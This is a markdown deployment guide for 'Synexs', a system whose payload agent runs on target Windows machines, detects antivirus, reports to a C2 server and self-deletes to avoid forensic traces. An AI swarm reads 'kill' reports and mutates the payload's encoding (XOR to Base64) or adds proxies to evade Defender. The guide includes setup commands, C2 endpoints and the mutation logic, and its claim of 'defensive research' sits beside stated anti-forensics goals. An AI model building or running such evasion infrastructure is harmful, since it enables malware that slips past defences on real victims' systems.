# Payload Agent - Real-World AV Kill Learning System

## Overview

This system tests AV detection mechanisms and trains the AI swarm to adapt based on real-world kills.

**Components:**
1. `payload_agent.py` - Runs on target systems, phones home with AV status
2. `report_server.py` - C2 server that receives agent reports
3. `ai_swarm_fixed.py` - Learns from kills and triggers mutations

## Architecture

```
Windows Laptop (Target)           VPS (your-target.com)           Docker Swarm
─────────────────────            ─────────────────────         ───────────────

payload_agent.py                  report_server.py              ai_swarm_fixed.py
     │                                   │                            │
     │ 1. Detect AV/Defender             │                            │
     │ 2. Phone home                     │                            │
     ├──────────────────────────────────>│ 3. Log to                  │
     │    POST /report                   │    real_world_kills.json   │
     │                                   │                            │
     │ 4. Self-destruct                  │                            │
     X (60s)                             │<───────────────────────────┤
                                         │    5. Read kills           │
                                         │    6. Trigger mutation     │
                                         │    7. Send Telegram alert  │
```

## Setup

### 1. VPS Setup (your-target.com)

```bash
# SSH into VPS
ssh root@your-target.com

# Upload report server
scp report_server.py root@your-target.com:/root/synexs/

# Start server
cd /root/synexs
nohup python3 report_server.py > report_server.log 2>&1 &

# Check status
curl http://your-target.com:8080/health
```

### 2. Target System (Windows Laptop)

```powershell
# Copy payload to laptop
scp payload_agent.py your-laptop:/path/to/test/

# Run payload
cd /path/to/test
python payload_agent.py

# Expected behavior:
# - Detects Windows Defender
# - Attempts to phone home to VPS
# - Self-deletes after 60s
```

### 3. Docker Swarm (AI Learning)

The swarm automatically reads kill reports every 30 minutes and:
- Detects AV kills
- Triggers encoding mutations (XOR → Base64)
- Sends Telegram alerts
- Saves mutation decisions to `datasets/av_mutation.json`

## Testing Workflow

### Test 1: Successful Phone-Home

```bash
# On VPS: Start server
python3 report_server.py

# On laptop: Run agent
python3 payload_agent.py

# Expected:
# ✓ Agent phones home successfully
# ✓ Report logged to real_world_kills.json
# ✓ Telegram alert: "✅ Agent Survived"
```

### Test 2: AV Kill Detection

```bash
# On laptop:
# 1. Run agent with Defender active
# 2. Defender may kill process or block network

# Expected:
# ✗ Agent killed by Defender or network blocked
# ✓ Local log saved to payload_report.json
# ✓ AI swarm reads kill on next cycle
# ✓ Telegram alert: "🧨 AV KILL"
# ✓ Mutation saved to av_mutation.json
```

### Test 3: Network Block

```bash
# On laptop:
# 1. Block your-target.com in firewall
# 2. Run agent

# Expected:
# ✗ Network connection refused
# ✓ Local log saved
# ✓ Telegram alert: "🚫 Network Block"
```

## Endpoints

### Report Server (Port 8080)

- `GET /` - Web dashboard
- `POST /report` - Receive agent reports
- `GET /stats` - View statistics
- `GET /reports?limit=N` - Get recent reports
- `GET /health` - Health check

### Example Report

```json
{
  "agent_id": "agent_1730825600000",
  "timestamp": "2025-11-05T12:00:00Z",
  "os": {
    "system": "Windows",
    "release": "11",
    "version": "10.0.22631",
    "python": "3.11.0"
  },
  "hostname": "LAPTOP-ABC123",
  "ip": "203.0.113.45",
  "av_status": {
    "detected": ["Windows Defender"],
    "defender_active": true,
    "processes": ["MsMpEng"]
  },
  "survived_seconds": 2.3,
  "blocked": false,
  "death_reason": "Natural timeout"
}
```

## AI Learning Logic

From `ai_swarm_fixed.py:413-461`:

```python
# Load kill reports
real_kills = json.load("datasets/real_world_kills.json")

for kill in real_kills:
    av_detected = kill["av_status"]["detected"]

    if "Windows Defender" in av_detected:
        # Trigger mutation
        mutation = {
            "action": "switch_encoding",
            "from": "xor",
            "to": "base64"
        }
        send_telegram("🧨 AV KILL → Switching to base64")
```

## Mutations Triggered

| Event | Mutation | Action |
|-------|----------|--------|
| AV Kill | switch_encoding | XOR → Base64 |
| Network Block | retry_with_proxy | Add proxy layer |
| Agent Survived 55s+ | mark_success | Replicate strategy |

## Security Notes

- All systems owned and controlled by operator
- No third-party targets
- Defensive research only
- VPS at your-target.com is authorized
- Self-destruct prevents forensic traces

## Monitoring

```bash
# Check report server logs
tail -f /root/synexs/report_server.log

# Check kill reports
cat /root/synexs/datasets/real_world_kills.json | jq

# Check AI swarm learning
docker logs synexs-swarm | grep "AV KILL"

# View stats
curl http://your-target.com:8080/stats | jq
```

## Troubleshooting

### Agent fails to phone home
- Check VPS firewall: `ufw status`
- Check server running: `ps aux | grep report_server`
- Check local logs: `cat payload_report.json`

### No Telegram alerts
- Check Telegram token in `ai_swarm_fixed.py:25`
- Test manually: `curl https://api.telegram.org/bot<TOKEN>/getMe`

### Swarm not learning
- Check kill log exists: `ls -la datasets/real_world_kills.json`
- Check swarm cycle: `docker logs synexs-swarm | grep "real-world"`

## Files Created

```
/root/synexs/
├── payload_agent.py              # Agent that runs on targets
├── report_server.py              # C2 server on VPS
├── ai_swarm_fixed.py             # Updated with AV learning
├── datasets/
│   ├── real_world_kills.json    # Kill reports from agents
│   ├── kill_stats.json          # Aggregated statistics
│   └── av_mutation.json         # Current mutation state
└── PAYLOAD_DEPLOYMENT.md         # This file
```

## Next Steps

1. Deploy `report_server.py` to VPS
2. Test `payload_agent.py` on Windows laptop
3. Monitor AI swarm learning from kills
4. Observe mutation triggers
5. Refine encoding strategies based on AV behavior

**Status: READY FOR DEPLOYMENT** ✅
